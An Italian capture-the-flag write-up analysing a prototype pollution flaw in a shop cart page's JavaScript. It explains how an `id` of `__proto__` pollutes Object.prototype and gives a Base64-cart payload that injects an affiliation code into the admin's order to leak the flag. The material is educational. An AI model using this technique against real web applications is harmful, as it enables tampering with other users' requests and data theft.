# Prototype Pollution negli Oggetti del Carrello

Nella pagina `/cart` si trova questo codice JavaScript:

```javascript
const cart = JSON.parse(atob(new URL(location.href).searchParams.get('cart')));

const products = {};

cart.forEach((el) => {
    const product = products[el.id] || (products[el.id] = {});

    for (const [key, value] of Object.entries(el)) {
        if (key === 'id') continue;
        product[key] = value;
    }
});

Object.values(products).forEach((product, idx) => {
    const d = document.createElement('div');
    d.innerText = product.name;
    document.querySelector('#product-list').appendChild(d);

    if (idx !== Object.values(products).length - 1) {
        document.querySelector('#product-list').appendChild(document.createElement('sl-divider'));
    }
});

orderForm.onsubmit = (e) => {
    e.preventDefault();

    fetch('/api/order', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            cart: cart,
            message: customMessage.value,
            affiliation: sessionStorage.affiliation
        })
    })
        .then((res) => res.json())
        .then((data) => {
            location.href = '/';
        })
        .catch((err) => {
            location.href = '/';
        });
};

feedbackForm.onsubmit = (e) => {
    e.preventDefault();

    fetch('/api/feedback', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            cart: cart,
            pow: pow.value
        })
    })
        .then(() => {
            window.location = '/';
        })
        .catch(() => {
            window.location = '/';
        });
};
```

## Analisi del Codice

Il punto più interessante è il seguente:

```javascript
const cart = JSON.parse(atob(new URL(location.href).searchParams.get('cart')));

const products = {};

cart.forEach((el) => {
    const product = products[el.id] || (products[el.id] = {});

    for (const [key, value] of Object.entries(el)) {
        if (key === 'id') continue;
        product[key] = value;
    }
});
```

Gli oggetti del carrello vengono parsati dal parametro `cart` dell'URL ed ogni oggetto dovrebbe avere questa forma (encodata in Base64): 

```json
[{"id":"67ebbd3b2f482a4adfa26a14","name":"Raspberry Pi 0"}]
```

Il codice cicla su tutti gli elementi che gli vengono mandati ed aggiunge arbitrariamente qualsiasi proprietà agli oggetti. In particolare, se un indice è presente due volte, vengono aggiunte o sovrascritte le sue proprietà. 

Il problema sta nel fatto che il controllo per verificare se l'`id` è già presente è:

```javascript
products[el.id] || (products[el.id] = {});
```

Quindi, inviando `__proto__` come `id`, il controllo dell'`id` già esistente passa, perché `__proto__` è una proprietà esistente. In questo caso, il valore di `product` diventa `products['__proto__']`. A questo punto, qualsiasi proprietà inviata verrà aggiunta a `__proto__` tramite:

```javascript
product[key] = value;
```
## Sfruttare la Vulnerabilità

Per sfruttare questa vulnerabilità, possiamo fare in modo che l'admin effettui un ordine con il nostro affiliation code (così potremo vedere il suo messaggio custom) per ottenere la flag. Per farlo, sfruttiamo la prototype pollution per sovrascrivere la proprietà `affiliation` con il valore del nostro affiliation code.

Il punto dove viene usata la proprietà affiliation è il seguente:

```javascript
fetch('/api/order', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        cart: cart,
        message: customMessage.value,
        affiliation: sessionStorage.affiliation
    })
});
```

### Soluzione

```json
[{"id": "__proto__", "affiliation": "codice affiliazione"}]
```